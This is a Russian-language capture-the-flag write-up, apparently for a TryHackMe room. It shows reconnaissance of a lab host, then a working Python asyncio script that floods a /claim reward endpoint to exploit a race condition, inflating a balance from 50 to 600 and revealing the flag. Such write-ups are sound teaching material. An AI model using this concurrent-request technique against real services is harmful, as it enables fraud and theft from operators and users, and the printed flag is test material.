**Теги:** Web Exploitation, Business Logic, API Abuse, Burp Suite.
**Сложность:** Medium.

## 1. Первичный доступ

Цель:

```text
10.114.169.103:3000
```

При переходе на веб-приложение происходит редирект:

```text
http://10.114.169.103:3000/auth/login
```

Регистрируем новую учётную запись:

```text
Username: ponzi1459A
Password: ponzi1459A
```

После авторизации попадаем на dashboard.

---

## 2. Сканирование портов

Запускаем Nmap:

```bash
sudo nmap -sS -sV 10.114.169.103
```

Вывод:

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-05 07:19 EDT
Nmap scan report for 10.114.169.103
Host is up (0.075s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
3000/tcp open  http    Node.js Express framework
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Открыты:

* `22/tcp` — SSH;
* `3000/tcp` — HTTP, Node.js Express.

Основной интерес представляет веб-приложение на порту `3000`.

---

## 3. Перечисление директорий

Используем Gobuster:

```bash
gobuster dir -u http://10.114.169.103:3000 -w ~/HH101/seclists/Discovery/Web-Content/common.txt
```

Результат:

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.114.169.103:3000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/deb88/HH101/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 153] [--> /css/]
/dashboard            (Status: 401) [Size: 61]
/js                   (Status: 301) [Size: 152] [--> /js/]
/vault                (Status: 401) [Size: 61]
Progress: 4752 / 4752 (100.00%)
```

Наиболее интересные endpoints:

```text
/dashboard
/vault
```

Оба требуют авторизации.

---

# 4. Анализ API dashboard

При обновлении `/dashboard` смотрим HTTP-запросы. Обнаруживается API:

```http
GET /dashboard/api/me HTTP/1.1
Host: 10.114.169.103:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Accept: */*
Referer: http://10.114.169.103:3000/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AlajEUBniMae0EC6ruoaTuMTksVKhvrkU.uNh7rYrCBO3nhu58Ec12PPqnygdIbfmJPnpzRrZA4II
If-None-Match: W/"11a-nV6fb9AfEqH1B3n+keHDWKq0TJk"
```

Наличие отдельных API endpoints делает приложение интересным для дальнейшего API enumeration.

---

# 5. Проверка `/vault`

Пробуем обратиться к `/vault`.

Получаем:

```json
{"error":"Access denied. Whale-tier balance required.","currentBalance":50,"required":150,"shortfall":100}
```

Это важная информация.

Приложение сообщает:

```text
Current balance: 50
Required balance: 150
Shortfall: 100
```

Следовательно, доступ к `/vault` зависит от количества средств на аккаунте.

Нужно увеличить баланс как минимум до `150`.

---

# 6. Поиск способа увеличить баланс

Изучаем API приложения и обнаруживаем endpoint перехватив запрос с помощью Caido:

```text
POST /claim
```

Пробуем отправить несколько запросов практически одновременно:

```bash
for i in {1..5}; do
  curl -s -X POST \
  -H "Cookie: connect.sid=s%3ABRhPdum_cy0CBt8i4PW1afYFBrZERps0.a2xpdJpglZAU2A2KSpgDsXIR1feGJDROy8dph8Pb%2FrA" \
  http://10.114.169.103:3000/claim &
done
wait
```

Запросы запускаются параллельно:

```text
[1] 10599
[2] 10600
[3] 10601
[4] 10602
[5] 10603
```

Однако сервер отвечает:

```text
{"error":"Reward already claimed. Please wait before claiming again.","secondsRemaining":85919}
```

для всех пяти запросов.

На этом этапе появляется предположение, что endpoint может быть уязвим к **race condition**.

---

# 7. Создание race-condition скрипта

Для более точной отправки большого количества запросов одновременно пишем собственный Python-скрипт с `asyncio` и `aiohttp`.

```python
import asyncio
import aiohttp

URL = "http://10.114.169.103:3000/claim"
HEADERS = {
    "Host": "10.114.169.103:3000",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Origin": "http://10.114.169.103:3000",
    "Referer": "http://10.114.169.103:3000/dashboard",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9",
    "Cookie": "connect.sid=s%3A_7y6k1VXegKSecxIo5JMQqIXVhbS1bBj.XoZJWNQSaQDuoxsr4uSSJpbmVw3Xx4b6tdA96xKF7ow",
    "Content-Length": "0",
}

async def claim(session, i):
    try:
        async with session.post(URL, headers=HEADERS, data=b"", timeout=8) as r:
            text = await r.text()
            print(f"[{i:02}] {r.status} → {text[:150]}")
    except Exception as e:
        print(f"[{i:02}] ERROR: {e}")

async def main():
    connector = aiohttp.TCPConnector(limit=30, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [claim(session, i) for i in range(12)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
```

Здесь создаётся `12` параллельных задач:

```python
tasks = [claim(session, i) for i in range(12)]
await asyncio.gather(*tasks)
```

Это позволяет отправить запросы практически одновременно и увеличить вероятность попадания нескольких запросов в race window.

---

# 8. Эксплуатация race condition

Запускаем:

```bash
python3 race.py
```

Получаем:

```text
[02] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":350,"tier":"Whale","priceSnapshot":4.2}
[05] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":350,"tier":"Whale","priceSnapshot":4.2}
[07] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":400,"tier":"Whale","priceSnapshot":4.2}
[00] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":350,"tier":"Whale","priceSnapshot":4.2}
[04] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":300,"tier":"Whale","priceSnapshot":4.2}
[06] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":600,"tier":"Whale","priceSnapshot":4.2}
[08] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":600,"tier":"Whale","priceSnapshot":4.2}
[11] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":600,"tier":"Whale","priceSnapshot":4.2}
[03] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":600,"tier":"Whale","priceSnapshot":4.2}
[09] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":600,"tier":"Whale","priceSnapshot":4.2}
[10] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":600,"tier":"Whale","priceSnapshot":4.2}
[01] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":600,"tier":"Whale","priceSnapshot":4.2}
```

Все запросы получили:

```text
200
```

и:

```text
"message":"Staking reward claimed successfully."
```

Вместо ожидаемого единственного получения награды сервер обработал несколько одновременных запросов.

Баланс увеличился с:

```text
50
```

до:

```text
600
```

При этом требовалось всего:

```text
150
```

для получения доступа к `/vault`.

Таким образом, race condition успешно эксплуатирована.

---

# 9. Получение доступа к Vault

Теперь баланс аккаунта соответствует требованиям:

```text
Current balance: 600
Required balance: 150
Tier: Whale
```

Переходим в:

```text
/vault
```

Доступ предоставляется.

Внутри находится флаг:

```text
THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}
```

---

# Итоговая цепочка

```text
Регистрация
ponzi1459A:ponzi1459A
        │
        ▼
Dashboard
        │
        ▼
API enumeration
        │
        ▼
/vault
        │
        ▼
Access denied
50 < 150
        │
        ▼
/claim
        │
        ▼
Попытка параллельных запросов
        │
        ▼
Race Condition
        │
        ▼
12 одновременных запросов
        │
        ▼
Баланс 50 → 600
        │
        ▼
Whale tier
        │
        ▼
/vault
        │
        ▼
THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}
```

## Flag

```text
THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}
```

### Уязвимость

Основная уязвимость комнаты — **race condition в endpoint `/claim`**. Сервер должен был атомарно проверять состояние награды и изменять баланс, но несколько почти одновременных запросов смогли пройти обработку и начислить награду многократно. Полученного баланса `600` оказалось достаточно для перехода в `/vault` и получения флага.
